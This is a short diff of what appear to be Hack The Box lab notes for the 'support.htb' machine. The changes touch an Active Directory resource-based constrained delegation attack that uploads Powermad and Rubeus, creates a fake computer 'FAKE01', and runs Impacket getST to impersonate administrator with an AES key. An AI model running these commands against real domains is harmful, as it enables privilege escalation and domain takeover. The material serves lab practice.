@@ -271,7 +271,7 @@ upload /home/user/Tools/Powermad/Powermad.ps1 pm.ps1
 upload /home/user/Tools/Ghostpack-CompiledBinaries/Rubeus.exe r.exe
 
 # Import PowerMad
-Import-Module ./pm.ps1
+. .\pm.ps1
 
 # Set variables
 Set-Variable -Name "FakePC" -Value "FAKE01"
@@ -294,8 +294,7 @@ Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties Principal
 
 # -------- On Attck Box Side.
 # Using getTGT from Impacket, generate a ccached TGT and used KERB5CCNAME pass the ccahe file for the requested service. 
-#   If you are getting errors, "cd ~/impacket/", "python3 -m pip install ."
-/home/user/Tools/impacket/examples/getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
+impacket-getST support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
 
 # Set local variable of KERB5CCNAME to pass the ccahe TGT file for the requested service.
 export KRB5CCNAME=administrator.ccache
